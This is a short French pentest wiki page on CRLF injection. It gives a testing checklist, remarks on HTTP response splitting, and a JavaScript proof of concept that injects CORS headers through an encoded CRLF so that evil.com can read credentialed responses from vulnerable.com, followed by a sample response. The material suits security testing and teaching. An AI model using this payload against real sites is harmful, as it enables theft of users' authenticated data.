---
title: CRLF Injection
permalink: /CRLF/
---

# CRLF Injection

## Points de contrôles

Les points suivants sont à vérifier:

- Valeurs réutilisées dans les headers (paramètre GET, POST, élément du Referer, etc.)
- Peut-on faire des retours à la ligne ? Essayer différents encodages.
- Peut-on ajouter un cookie arbitraire (Cookie: lang=$p avec $p = "xx; session=truc)

## Exploitation

### HTTP Response Splitting

Les attaques du type "HTTP Response Splitting" ne semblent pas marcher dans la vraie vie. Firefox & Chrome checkent les réponses et renvoie une erreur quand certains headers apparaissent en double (voir [Duplicate headers received from server](https://stackoverflow.com/questions/13578428/duplicate-headers-received-from-server) et [Firefox Advisory](https://www.mozilla.org/en-US/security/advisories/mfsa2011-39/)).

### Modification de la réponse

Il est possible de modifier la réponse en terminant le header et en injectant du code arbitraire à la suite.

### Same Origin Policy Bypass

On peut utiliser la vulnrébilité pour contourner la SOP grâce à [CORS](/CORS/). Le payload JS suivant peut servir de PoC (JS sur le domaine http://evil.com ciblant http://vulnerable.com)

``` javascript
<html>
    CORS Bypass
    <script>
        var xhr = new XMLHttpRequest();   // new HttpRequest instance 
        xhr.onreadystatechange = function() {
            if (xhr.readyState == XMLHttpRequest.DONE) {
                alert(xhr.responseText);
            }
        }
        xhr.withCredentials = true; 
        xhr.open("GET", 'http://vulnerable.com?NAME=test.html"%0D%0AAccess-Control-Allow-Origin:+http://evil.com%0D%0AAccess-Control-Allow-Credentials:+true%0D%0Atest:"')
        xhr.send();
    </script>
</html>
```
La réponse sera de la forme

``` text
HTTP/1.1 200 OK
Date: Mon, 08 Jan 2018 16:37:15 GMT
Content-Disposition: attachment;filename="test.html"
Access-Control-Allow-Origin: http://evil.com
Access-Control-Allow-Credentials: true
test:""
Content-Type: text/html;charset=UTF-8
Content-Length: 68
Connection: close

[CONTENU]
```

Ce qui permet de bypasse la SOP.

## Payloads

Voir [PayloadAllTheThings](https://github.com/ruuand/PayloadsAllTheThings/tree/master/CRLF%20injection)
